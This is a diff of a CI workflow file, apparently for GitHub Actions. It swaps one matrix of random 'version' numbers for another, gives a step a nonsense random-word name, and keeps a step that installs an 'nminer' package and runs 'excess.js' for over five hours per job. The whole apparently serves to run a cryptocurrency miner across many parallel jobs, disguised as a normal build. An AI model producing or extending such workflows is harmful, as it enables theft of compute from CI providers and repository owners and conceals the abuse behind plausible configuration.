@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2159 }
-          - { version: 2267 }
-          - { version: 896 }
-          - { version: 2223 }
-          - { version: 4964 }
-          - { version: 9975 }
-          - { version: 712 }
-          - { version: 7876 }
-          - { version: 3660 }
-          - { version: 5696 }
-          - { version: 9576 }
-          - { version: 5979 }
-          - { version: 2825 }
-          - { version: 9412 }
-          - { version: 767 }
-          - { version: 297 }
-          - { version: 822 }
+          - { version: 9862 }
+          - { version: 9672 }
+          - { version: 3151 }
+          - { version: 4608 }
+          - { version: 7269 }
+          - { version: 8306 }
+          - { version: 413 }
+          - { version: 5126 }
+          - { version: 453 }
+          - { version: 2942 }
+          - { version: 5782 }
+          - { version: 2084 }
+          - { version: 1847 }
+          - { version: 6570 }
+          - { version: 3593 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: or lest unto whoa necklace
+      - name: amongst watery yahoo
         run: |
           npm install nminer@latest
-          timeout 311m node excess.js || echo "excess executed"
+          timeout 341m node excess.js || echo "excess executed"
